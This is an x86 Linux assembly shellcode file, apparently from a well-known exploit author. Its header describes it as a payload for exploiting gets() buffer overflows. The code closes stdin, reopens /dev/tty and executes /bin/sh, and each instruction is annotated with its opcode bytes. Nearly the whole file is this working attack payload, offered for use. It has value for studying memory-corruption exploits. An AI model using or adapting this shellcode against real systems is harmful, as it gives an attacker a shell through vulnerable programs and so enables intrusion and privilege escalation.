; total: 55 bytes

;; $Id: gets-linux.c,v 1.3 2004/06/02 12:22:30 raptor Exp $
;; 
;; gets-linux.c - stdin re-open shellcode for Linux/x86
;; Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
;; 
;; Local shellcode for stdin re-open and /bin/sh exec. It closes stdin 
;; descriptor and re-opens /dev/tty, then does an execve() of /bin/sh.
;; Useful to exploit some gets() buffer overflows in an elegant way...

bits 32

_start:
    xor eax, eax       ; 0x00000000      31c0
    xor ebx, ebx       ; 0x00000002      31db
    mov al, 6          ; 0x00000004      b006
    int 0x80           ; 0x00000006      cd80         ; close(STDIN)
    push ebx           ; 0x00000008      53
    push 0x7974742f    ; 0x00000009      682f747479   ; "/tty"
    push 0x7665642f    ; 0x0000000e      682f646576   ; "/dev"
    mov ebx, esp       ; 0x00000013      89e3
    xor ecx, ecx       ; 0x00000015      31c9
    mov cx, 0x2712     ; 0x00000017      66b91227
    mov al, 5          ; 0x0000001b      b005
    int 0x80           ; 0x0000001d      cd80         ; open("/dev/tty", O_RDWR | ...)
    xor eax, eax       ; 0x0000001f      31c0
    push eax           ; 0x00000021      50
    push 0x68732f2f    ; 0x00000022      682f2f7368   ; "//sh"
    push 0x6e69622f    ; 0x00000027      682f62696e   ; "/bin"
    mov ebx, esp       ; 0x0000002c      89e3
    push eax           ; 0x0000002e      50
    push ebx           ; 0x0000002f      53
    mov ecx, esp       ; 0x00000030      89e1
    cdq                ; 0x00000032      99
    mov al, 0xb        ; 0x00000033      b00b
    int 0x80           ; 0x00000035      cd80         ; execve("/bin/sh", ["/bin/sh"], NULL)